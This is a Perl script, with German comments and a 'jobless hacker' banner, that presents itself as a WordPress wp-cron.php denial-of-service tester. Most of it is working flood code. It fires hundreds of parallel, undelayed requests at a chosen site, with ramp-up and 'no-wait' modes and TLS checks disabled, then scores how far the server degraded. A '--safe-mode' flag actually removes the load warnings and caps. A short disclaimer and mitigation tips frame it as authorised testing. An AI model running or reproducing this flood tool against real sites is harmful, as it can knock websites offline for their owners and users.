#!/usr/bin/perl
#┌────────────────────────────────────────────────────────────────────────┐
#│                                                                        │
#│         ███████╗████████╗ ██████╗ ███████╗██████╗ ████████╗██╗         │
#│         ██╔════╝╚══██╔══╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██║         │
#│         ███████╗   ██║   ██║   ██║█████╗  ██████╔╝   ██║   ██║         │
#│         ╚════██║   ██║   ██║   ██║██╔══╝  ██╔══██╗   ██║   ██║         │
#│         ███████║   ██║   ╚██████╔╝███████╗██║  ██║   ██║   ██║         │
#│         ╚══════╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝         │
#│                                                                        │
#│                    "old school, still root"                            │
#│                    "stoerti - the jobless hacker"                      │
#│                                                                        │
#│    ┌──────────────────────────────────────────────────────────────┐    │
#│    │  40 years in the trenches.     │  6 months unemployed in DE. │    │
#│    │  They fired the one who knew.  │  This is my legacy.         │    │
#│    │                   -- no patches for reality --               │    │
#│    └──────────────────────────────────────────────────────────────┘    │
#│                                                                        │
#└────────────────────────────────────────────────────────────────────────┘
# MIT License
#
# Copyright (c) 2026 Klaus Baumdick
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# ============================================================================
# DISCLAIMER
# ============================================================================
#
# This script is intended solely for educational purposes and authorized
# penetration testing in controlled environments.
#
# Unauthorized use of this script against systems without explicit written
# permission is illegal and may result in criminal or civil liability.
#
# The author assumes no responsibility for any misuse, damages, or legal
# consequences arising from the use of this script.
#
# USE AT YOUR OWN RISK.
# ============================================================================

use strict;
use warnings;
use LWP::UserAgent;
use Time::HiRes qw(time);
use Getopt::Long;
use Term::ANSIColor qw(:constants);
use JSON::PP;
use Parallel::ForkManager;
use Socket;

# ======================================================================
# WORDPRESS CRON JOB DOS TESTER
# ======================================================================
# Autor:  Klaus Baumdick (stoerti) aka "The jobless hacker"
# Zweck:  Testet ob wp-cron.php für Denial-of-Service anfällig ist
# Version: 1.0
# Lizenz: CC BY-NC-ND 4.0
# ======================================================================
# Testet durch:
#   • Parallele Requests an wp-cron.php
#   • Antwortzeit-Messung unter Last
#   • CPU/Last-Indikatoren
#   • Timeout-Verhalten bei Überlast
# ======================================================================

# Farben
my $GREEN = GREEN;
my $RED = RED;
my $YELLOW = YELLOW;
my $CYAN = CYAN;
my $RESET = RESET;

# ======================================================================
# KONFIGURATION
# ======================================================================
my %config = (
    target_url      => '',
    cron_path       => '/wp-cron.php',
    requests        => 100,        # Anzahl Requests
    concurrency     => 10,         # Parallele Threads
    timeout         => 30,         # Timeout pro Request
    delay           => 0,          # Delay zwischen Requests (0 für DoS-Test)
    verbose         => 0,
    quiet           => 0,
    output_json     => '',
    user_agent      => 'Mozilla/5.0 (WordPress Cron DoS Tester)',
    follow_redirects => 0,
    cookie          => '',
    auth_user       => '',
    auth_pass       => '',
    ramp_up         => 0,           # Langsam steigern statt sofort volle Last
    duration        => 10,          # Testdauer in Sekunden
    threshold       => 5,           # Faktor für Baseline-Vergleich
    baseline_first  => 1,           # Baseline-Test durchführen
    safe_mode       => 0,           # Warnung bei hohen Werten
    no_wait         => 0,           # Nicht auf Antwort warten (schneller)
);

# ======================================================================
# KOMMANDOZEILENOPTIONEN
# ======================================================================
GetOptions(
    'url=s'           => \$config{target_url},
    'cron=s'          => \$config{cron_path},
    'requests=i'      => \$config{requests},
    'concurrency=i'   => \$config{concurrency},
    'timeout=i'       => \$config{timeout},
    'delay=f'         => \$config{delay},
    'verbose'         => \$config{verbose},
    'quiet'           => \$config{quiet},
    'output=s'        => \$config{output_json},
    'user-agent=s'    => \$config{user_agent},
    'follow-redirects'=> \$config{follow_redirects},
    'cookie=s'        => \$config{cookie},
    'auth=s'          => \$config{auth_user},
    'auth-pass=s'     => \$config{auth_pass},
    'ramp-up'         => \$config{ramp_up},
    'duration=i'      => \$config{duration},
    'threshold=f'     => \$config{threshold},
    'no-baseline'     => sub { $config{baseline_first} = 0 },
    'safe-mode'       => \$config{safe_mode},
    'no-wait'         => \$config{no_wait},
    'help'            => sub { print_help(); exit 0; }
) or die "Fehler in Optionen. Verwende --help\n";

# ======================================================================
# VALIDIERUNG
# ======================================================================
validate_config();

# ======================================================================
# INITIALISIERUNG
# ======================================================================
my $start_time = time();
my $cron_url = $config{target_url} . $config{cron_path};
my @results = ();
my $baseline_time = 0;
my $total_requests = 0;
my $successful_requests = 0;
my $failed_requests = 0;
my $timeout_requests = 0;
my @response_times = ();

show_banner();
print_info("Ziel: $cron_url");
print_info("Requests: $config{requests}");
print_info("Concurrency: $config{concurrency}");
print_info("Timeout: $config{timeout} Sekunden");

if ($config{no_wait}) {
    print_warning("No-Wait Modus: Es wird nicht auf Antworten gewartet");
}

if (!$config{safe_mode} && ($config{requests} > 500 || $config{concurrency} > 50)) {
    print_warning("Hohe Last! $config{requests} Requests mit $config{concurrency} parallel");
    print "Fortfahren? (j/N): ";
    my $answer = <STDIN>;
    chomp $answer;
    exit 0 unless $answer =~ /^j/i;
}

# ======================================================================
# 1. PRÜFEN OB WP-CRON ERREICHBAR IST
# ======================================================================
print_section("BASIS-CHECK");

my $ua = create_user_agent();
my $test_response = $ua->get($cron_url);

if (!$test_response->is_success && $test_response->code != 200) {
    print_warning("wp-cron.php antwortet mit HTTP " . $test_response->code);
    print "Trotzdem testen? (j/N): ";
    my $answer = <STDIN>;
    chomp $answer;
    exit 0 unless $answer =~ /^j/i;
} else {
    print_success("wp-cron.php erreichbar (HTTP " . $test_response->code . ")");
}

# ======================================================================
# 2. BASELINE MESSUNG (EINZELNER REQUEST)
# ======================================================================
if ($config{baseline_first}) {
    print_section("BASELINE-MESSUNG");

    my $start = time();
    my $resp = $ua->get($cron_url);
    $baseline_time = time() - $start;

    print_info("Einzelner Request: " . sprintf("%.3f", $baseline_time) . "s");
    print_info("HTTP Status: " . $resp->code);

    if ($resp->is_success) {
        my $size = length($resp->content);
        print_info("Antwortgröße: " . int($size/1024) . " KB");
    }
}

# ======================================================================
# 3. LASTTEST DURCHFÜHREN
# ======================================================================
print_section("LASTTEST");

if ($config{ramp_up}) {
    print_info("Ramp-Up Modus: Steigere Last langsam");
    run_ramp_up_test();
} else {
    run_parallel_test();
}

# ======================================================================
# 4. STATISTIKEN BERECHNEN
# ======================================================================
my $avg_time = @response_times ? (sum(@response_times) / @response_times) : 0;
my $min_time = @response_times ? min(@response_times) : 0;
my $max_time = @response_times ? max(@response_times) : 0;
my $success_rate = $total_requests ? ($successful_requests / $total_requests * 100) : 0;

# ======================================================================
# 5. ERGEBNISSE ANZEIGEN
# ======================================================================
print_section("ERGEBNISSE");

show_results();

# ======================================================================
# 6. VULNERABILITÄT BEWERTEN
# ======================================================================
my $vulnerability_score = assess_vulnerability();

# ======================================================================
# 7. OUTPUT SPEICHERN
# ======================================================================
if ($config{output_json}) {
    save_output($vulnerability_score);
}

# ======================================================================
# 8. EMPFEHLUNGEN
# ======================================================================
print_recommendations($vulnerability_score);

# ======================================================================
# ABSCHLUSS
# ======================================================================
my $total_time = time() - $start_time;
print_info(sprintf("Gesamtzeit: %.2f Sekunden", $total_time));
print_info("Erfolgsrate: " . sprintf("%.1f%%", $success_rate));

exit($vulnerability_score > 5 ? 2 : ($vulnerability_score > 2 ? 1 : 0));

# ======================================================================
# HILFSFUNKTIONEN
# ======================================================================

sub validate_config {
    if (!$config{target_url}) {
        print_error("Keine Ziel-URL angegeben");
        print "Verwendung: $0 --url https://example.com [Optionen]\n";
        exit 1;
    }

    $config{target_url} =~ s/\/$//;
    if ($config{target_url} !~ /^https?:\/\//) {
        $config{target_url} = 'https://' . $config{target_url};
        print_warning("URL zu https:// ergänzt");
    }

    if ($config{concurrency} > 100 && !$config{safe_mode}) {
        print_warning("Sehr hohe Concurrency ($config{concurrency})");
        print "Mit --safe-mode überschreiben oder Wert reduzieren.\n";
        exit 1;
    }
}

sub create_user_agent {
    my $ua = LWP::UserAgent->new(
        timeout => $config{timeout},
        agent => $config{user_agent},
        max_size => 1024 * 1024,
        keep_alive => 1,  # Keep-Alive für bessere Performance
        max_redirect => $config{follow_redirects} ? 5 : 0,
        cookie_jar => {},
    );

    $ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0);

    if ($config{auth_user} && $config{auth_pass}) {
        $ua->credentials($config{target_url}, '', $config{auth_user}, $config{auth_pass});
    }

    if ($config{cookie}) {
        $ua->default_header('Cookie' => $config{cookie});
    }

    $ua->default_header('Accept' => '*/*');
    $ua->default_header('Connection' => 'keep-alive');

    return $ua;
}

sub run_parallel_test {
    my $pm = new Parallel::ForkManager($config{concurrency});

    # Data structure retrieval callback
    $pm->run_on_finish( sub {
        my ($pid, $exit_code, $ident, $exit_signal, $core_dump, $data) = @_;
        if ($data) {
            push @results, $data;
            $total_requests++;

            if ($data->{success}) {
                $successful_requests++;
                push @response_times, $data->{duration};
            } else {
                $failed_requests++;
                $timeout_requests++ if $data->{timeout};
            }

            # Fortschritt anzeigen
            if (!$config{quiet} && $total_requests % 10 == 0) {
                print "\r  Fortschritt: $total_requests/$config{requests} (" .
                      sprintf("%.1f", $total_requests/$config{requests}*100) . "%)";
            }
        }
    });

    print_info("Starte $config{requests} Requests mit $config{concurrency} parallelen Threads...");

    for (my $i = 1; $i <= $config{requests}; $i++) {
        $pm->start and next;

        my $result = send_request($i);
        $pm->finish(0, $result);

        # Delay zwischen Starts für Ramp-Up
        if ($config{delay} > 0) {
            select(undef, undef, undef, $config{delay});
        }
    }

    $pm->wait_all_children();
    print "\n" if !$config{quiet};
}

sub run_ramp_up_test {
    my $start_time = time();
    my $request_count = 0;
    my $current_concurrency = 1;

    while (time() - $start_time < $config{duration}) {
        my $pm = new Parallel::ForkManager($current_concurrency);

        print_info("Phase mit $current_concurrency parallelen Requests");

        for (my $i = 1; $i <= $current_concurrency; $i++) {
            $pm->start and next;

            my $result = send_request($request_count++);
            $pm->finish(0, $result);
        }

        $pm->wait_all_children();

        # Concurrency erhöhen
        $current_concurrency = int($current_concurrency * 1.5);
        last if $current_concurrency > $config{concurrency};

        sleep(2);  # Pause zwischen Phasen
    }
}

sub send_request {
    my ($id) = @_;

    my $ua = create_user_agent();
    my $start = time();
    my $response;
    my $timeout_occurred = 0;

    if ($config{no_wait}) {
        # Nicht auf Antwort warten (nur Verbindung aufbauen)
        eval {
            local $SIG{ALRM} = sub { die "timeout\n"; };
            alarm(1);  # Kurzer Timeout
            $ua->get($cron_url);
            alarm(0);
        };
        my $duration = time() - $start;
        return {
            id => $id,
            duration => $duration,
            success => 1,
            timeout => 0,
            code => 0,
        };
    }

    eval {
        local $SIG{ALRM} = sub { die "timeout\n"; };
        alarm($config{timeout});
        $response = $ua->get($cron_url);
        alarm(0);
    };

    my $duration = time() - $start;

    if ($@ && $@ =~ /timeout/) {
        $timeout_occurred = 1;
        return {
            id => $id,
            duration => $duration,
            success => 0,
            timeout => 1,
            code => 0,
        };
    }

    return {
        id => $id,
        duration => $duration,
        success => $response->is_success ? 1 : 0,
        timeout => 0,
        code => $response->code,
        size => length($response->content),
    };
}

sub show_results {
    print "\n" . "=" x 60 . "\n";
    print "TESTERGEBNISSE:\n";
    print "=" x 60 . "\n";

    print "  • Erfolgreiche Requests: $successful_requests\n";
    print "  • Fehlgeschlagene: $failed_requests\n";
    print "  • Timeouts: $timeout_requests\n";

    if (@response_times > 0) {
        print "\n  • Minimale Antwortzeit: " . sprintf("%.3f", $min_time) . "s\n";
        print "  • Maximale Antwortzeit: " . sprintf("%.3f", $max_time) . "s\n";
        print "  • Durchschnitt: " . sprintf("%.3f", $avg_time) . "s\n";

        # Perzentile berechnen
        my @sorted = sort { $a <=> $b } @response_times;
        my $p50 = $sorted[int($#sorted * 0.5)];
        my $p90 = $sorted[int($#sorted * 0.9)];
        my $p95 = $sorted[int($#sorted * 0.95)];

        print "  • Median (P50): " . sprintf("%.3f", $p50) . "s\n";
        print "  • P90: " . sprintf("%.3f", $p90) . "s\n";
        print "  • P95: " . sprintf("%.3f", $p95) . "s\n";
    }

    if ($baseline_time > 0 && $avg_time > 0) {
        my $factor = $avg_time / $baseline_time;
        print "\n  • Baseline: " . sprintf("%.3f", $baseline_time) . "s\n";
        print "  • Lastfaktor: " . sprintf("%.1f", $factor) . "x langsamer\n";
    }
}

sub assess_vulnerability {
    my $score = 0;

    # Timeouts sind ein starkes Indiz
    if ($timeout_requests > $config{requests} * 0.1) {
        $score += 3;
        print_warning("⚠️  Viele Timeouts ($timeout_requests) - Server überlastet?");
    }

    # Antwortzeit steigt stark an
    if ($baseline_time > 0 && $avg_time > $baseline_time * $config{threshold}) {
        $score += 2;
        print_warning("⚠️  Antwortzeit stark erhöht (Faktor " .
                     sprintf("%.1f", $avg_time/$baseline_time) . ")");
    }

    # Hohe Fehlerrate
    if ($failed_requests > $config{requests} * 0.2) {
        $score += 2;
        print_warning("⚠️  Hohe Fehlerrate ($failed_requests fehlgeschlagen)");
    }

    # Erfolgsrate unter 50%
    my $success_rate = $total_requests ? ($successful_requests / $total_requests * 100) : 0;
    if ($success_rate < 50) {
        $score += 3;
        print_warning("⚠️  Erfolgsrate unter 50%");
    }

    print "\n" . "=" x 60 . "\n";
    print "SCHWACHSTELLEN-SCORE: $score/10\n";

    if ($score >= 7) {
        print_color("$RED🔴 KRITISCH: Server ist anfällig für DoS!$RESET");
    } elsif ($score >= 4) {
        print_color("$YELLOW🟡 MITTEL: Server zeigt Anzeichen von Überlastbarkeit$RESET");
    } else {
        print_color("$GREEN🟢 GERING: Server scheint robust gegen DoS$RESET");
    }

    return $score;
}

sub save_output {
    my ($score) = @_;

    my $output = {
        tool => "WordPress Cron DoS Tester",
        version => "1.0",
        timestamp => scalar(localtime()),
        target => $cron_url,
        config => \%config,
        statistics => {
            total_requests => $total_requests,
            successful => $successful_requests,
            failed => $failed_requests,
            timeouts => $timeout_requests,
            baseline_time => $baseline_time,
            avg_response => $avg_time,
            min_response => $min_time,
            max_response => $max_time,
            p50 => $response_times[int($#response_times * 0.5)],
            p90 => $response_times[int($#response_times * 0.9)],
            p95 => $response_times[int($#response_times * 0.95)],
        },
        vulnerability_score => $score,
        vulnerability_level => $score >= 7 ? "CRITICAL" : ($score >= 4 ? "MEDIUM" : "LOW"),
        total_time => time() - $start_time,
    };

    if ($config{output_format} eq 'json' || $config{output_json} =~ /\.json$/) {
        my $json = JSON::PP->new->pretty->encode($output);
        open(my $fh, '>', $config{output_json}) or die "Kann Datei nicht öffnen: $!";
        print $fh $json;
        close($fh);
        print_success("JSON gespeichert: $config{output_json}");
    }
}

sub print_recommendations {
    my ($score) = @_;

    print_section("EMPFEHLUNGEN");

    my @recs = (
        "• WP-Cron deaktivieren und echten Cron verwenden:",
        "  define('DISABLE_WP_CRON', true);",
        "• Rate Limiting für wp-cron.php einrichten",
        "• Cache-Plugin für wp-cron verwenden",
        "• Server-Ressourcen überwachen (CPU, Memory, I/O)",
        "• CDN oder WAF vor die WordPress-Instanz setzen",
    );

    if ($score >= 7) {
        unshift @recs, "🔴 SOFORT HANDELN! Server ist DoS-gefährdet!";
        unshift @recs, "• wp-cron.php via .htaccess schützen:";
        unshift @recs, "  <Files wp-cron.php>";
        unshift @recs, "      Order Deny,Allow";
        unshift @recs, "      Deny from all";
        unshift @recs, "  </Files>";
    }

    foreach (@recs) {
        print "$_\n";
    }
}

sub print_help {
    print <<"HELP";
================================================================================
WORDPRESS CRON JOB DOS TESTER v1.0
================================================================================

BESCHREIBUNG:
  Testet ob wp-cron.php durch viele parallele Requests überlastet werden kann.
  Simuliert DoS-Angriffe auf den WordPress-Cron-Mechanismus.

RISIKEN:
  • Hohe CPU-Last auf dem Server
  • Timeouts bei legitimen Requests
  • Datenbank-Überlastung
  • Ausfall der Website

VERWENDUNG:
  $0 --url <wordpress-url> [Optionen]

OPTIONEN:
  --url URL        WordPress-URL (z.B. https://example.com)
  --cron PATH      Pfad zu wp-cron.php (Default: /wp-cron.php)

  --requests N     Anzahl Requests (Default: 100)
  --concurrency N  Parallele Threads (Default: 10)
  --timeout N      Timeout pro Request (Default: 30)
  --delay N        Delay zwischen Requests (Default: 0)

  --ramp-up        Last langsam steigern (Default: aus)
  --duration N     Testdauer für Ramp-Up (Default: 10s)
  --threshold F    Faktor für Baseline-Vergleich (Default: 5)
  --no-baseline    Keine Baseline-Messung
  --no-wait        Nicht auf Antwort warten (schneller)

  --safe-mode      Warnungen bei hohen Werten unterdrücken
  --verbose        Ausführliche Ausgabe
  --quiet          Minimale Ausgabe
  --output DATEI   Ergebnisse als JSON speichern

  --help           Diese Hilfe anzeigen

BEISPIELE:
  # Standard-Test
  $0 --url https://example.com

  # DoS-Simulation (1000 Requests, 50 parallel)
  $0 --url https://example.com --requests 1000 --concurrency 50

  # Ramp-Up Test (langsam steigern)
  $0 --url https://example.com --ramp-up --duration 30 --concurrency 100

  # Mit JSON-Output
  $0 --url https://example.com --output cron-test.json --verbose

WARNUNG:
  • Kann den Server stark belasten oder zum Absturz bringen!
  • Nur auf eigenen oder autorisierten Systemen testen!
  • CC BY-NC-ND 4.0 Lizenz - Nur für Bildungszwecke

================================================================================
HELP
    exit 0;
}

sub show_banner {
    print <<"BANNER";
$CYAN================================================================================
WORDPRESS CRON JOB DOS TESTER v1.0
================================================================================$RESET
BANNER
}

sub print_section {
    my ($title) = @_;
    print "\n$CYAN▶ $title$RESET\n";
    print "-" x 40 . "\n";
}

sub print_success {
    my ($msg) = @_;
    print "$GREEN✓ $msg$RESET\n" unless $config{quiet};
}

sub print_error {
    my ($msg) = @_;
    print "$RED❌ $msg$RESET\n";
}

sub print_warning {
    my ($msg) = @_;
    print "$YELLOW⚠️  $msg$RESET\n";
}

sub print_info {
    my ($msg) = @_;
    print "  $msg\n" if $config{verbose} && !$config{quiet};
}

sub print_color {
    my ($msg) = @_;
    print "$msg\n";
}

sub sum {
    my $sum = 0;
    $sum += $_ for @_;
    return $sum;
}

sub min {
    my $min = shift;
    foreach (@_) {
        $min = $_ if $_ < $min;
    }
    return $min;
}

sub max {
    my $max = shift;
    foreach (@_) {
        $max = $_ if $_ > $max;
    }
    return $max;
}

__END__
